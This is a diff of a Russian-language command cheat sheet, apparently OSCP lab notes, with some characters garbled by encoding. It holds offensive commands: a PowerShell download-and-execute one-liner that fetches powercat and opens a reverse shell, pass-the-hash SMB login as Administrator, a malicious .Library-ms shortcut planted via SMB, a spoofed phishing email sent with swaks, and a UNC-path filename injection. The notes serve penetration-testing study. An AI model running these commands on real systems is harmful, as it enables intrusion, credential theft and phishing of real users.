@@ -1,6 +1,5 @@
 export key="value"
         setup variable for all subprocess (overwise set key="value" only for current user)
-!!      повторить последнюю команду
 wc      подсчет байт/символов/слов/строк в файле
 sed     редактирование на лету (stream editing: sed 's/from/to/')
 cat file | grep pattern | cut -d ' ' -f4 | tr -d '%' | sort | uniq
@@ -319,6 +318,8 @@ smbclient -L \\\\ip\\
 	попытка подключени€ к samba серверу, smbclient \\\\ip\\ IPC$
 smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 	соединение к удаленной машине с хешем пользовател€
+sudo impacket-smbserver config /home/user/re/oscp/labs/webdav -smb2support 
+	поднимаем smb сервер на локальной машине, также можно задать логин и пароль через ключи
 crontab -l
 	поиск задач в cron от текущего пользовател€
 crontab -u root -l
@@ -352,11 +353,13 @@ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/user/re/oscp/labs
 </searchConnectorDescription>
 </searchConnectorDescriptionList>
 </libraryDescription>
-
-powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.170:80/powercat.ps1');powercat -c 192.168.45.170 -p 4444 -e powershell"
+	файл .Library-ms, 192.168.45.170 - IP своей машины
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.170:8000/powercat.ps1');powercat -c 192.168.45.170 -p 4444 -e powershell"
 	созданна€ ссылка в папке WevDAV (по вызову из меню new->shortcut)
 smbclient //192.168.222.195/share -c 'put config.Library-ms'
 	копируем созданный €рлык в папку WebDAV через самбу, 192.168.222.195 - IP адрес атакуемой машины
+swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach @config.Library-ms --server 192.168.224.199 --body @body.txt --header "Subject: Problems" --suppress-data
+	отправл€ем письмо от имени test@supermagicorg.com через сервер с IP 192.168.224.199 с телом body.txt и вложением config.Library-ms
 
 ==========BURP
 filename="\\\\192.168.45.232\\share\\test.txt"
